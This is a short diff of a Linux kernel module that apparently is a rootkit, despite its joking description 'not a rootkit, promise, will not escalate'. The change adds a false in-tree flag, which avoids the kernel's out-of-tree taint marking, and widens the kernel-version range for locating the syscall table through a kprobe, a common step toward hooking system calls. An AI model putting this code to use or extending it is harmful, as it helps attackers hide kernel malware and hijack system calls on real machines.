@@ -17,6 +17,7 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("s3xmalloc");
 MODULE_DESCRIPTION("not a rootkit, promise, will not escalate >UwU<");
 MODULE_VERSION("0.0.1");
+MODULE_INFO(intree,"Y");
 
 unsigned long *__sys_call_table;
 
@@ -121,7 +122,7 @@ static unsigned long *get_syscall_table(void)
 {
 	unsigned long *syscall_table;
 
-	#if (LINUX_VERSION_CODE > KERNEL_VERSION(5, 10, 0))
+	#if (LINUX_VERSION_CODE > KERNEL_VERSION(4, 10, 0))
 	{
 		register_kprobe(&sys_call_table_kp);
 		syscall_table = (unsigned long*)sys_call_table_kp.addr;
